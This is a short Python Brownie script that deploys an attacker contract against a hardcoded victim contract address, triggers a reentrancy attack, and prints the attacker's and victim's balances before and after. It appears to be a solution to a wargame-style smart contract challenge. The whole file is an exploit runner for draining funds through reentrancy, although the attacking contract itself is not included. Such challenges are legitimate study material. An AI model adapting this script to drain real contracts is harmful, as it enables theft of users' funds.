from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from brownie import Reentrance, network, AttackReentrance, Contract


def deploy_Reentrance():
    account = get_account()
    reentracne = Reentrance.deploy(
        {"from": account, "value": POINT_ONE / 10000},
    )
    return reentracne


def deploy_AttackReentrance(victim):
    account = get_account()
    attack = AttackReentrance.deploy(
        victim,
        {"from": account, "value": POINT_ONE / 10},
    )
    return attack


def main():
    print(network.show_active())
    account = get_account()
    victim_address = "0xdc498bceaAb7D4A270acD20e70082eeEa7cA10b6"
    # victim_address = deploy_Reentrance()
    # victim = Contract.from_abi(Reentrance._name, victim_address, Reentrance.abi)

    attack = deploy_AttackReentrance(victim_address)
    # print(f"{victim.balance()}: victim")
    print(f"{attack.balance()}: attack")
    print(f"{account.balance()}: me")
    attack.attack()
    # print(f"{victim.balance()}: victim")
    print(f"{attack.balance()}: attack")
    print(f"{account.balance()}: me")
